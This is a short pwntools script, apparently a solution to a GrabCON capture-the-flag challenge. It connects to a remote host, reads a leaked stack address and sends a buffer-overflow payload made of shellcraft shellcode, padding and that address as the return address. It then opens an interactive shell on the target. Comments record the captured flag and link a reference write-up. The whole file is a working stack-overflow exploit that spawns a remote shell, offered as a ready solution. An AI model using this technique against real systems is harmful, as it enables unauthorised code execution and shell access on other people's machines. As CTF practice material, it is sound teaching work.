from pwn import *



r = remote('35.246.42.94', 1337)

r.recvuntil('eat some ')

stack_add = int(r.recvuntil('!\n', drop = True).decode(),16)
 
payload  = b''
# shellcraft.sh() is shell code, asm() compiles your shellcode and provides its binary string
payload += asm(shellcraft.sh())
# print(shellcraft.sh())
payload += (294 - len(payload)) * b'A'
payload += b'B' * 8
payload += p64(stack_add)

r.sendline(payload)

r.interactive()

# flag = GrabCON{Y0U_g0t_Sh3ll_B4asics}
# reference = https://github.com/datajerk/ctf-write-ups/blob/master/sunshinectf2020/speedrun/README.md#speedrun-03
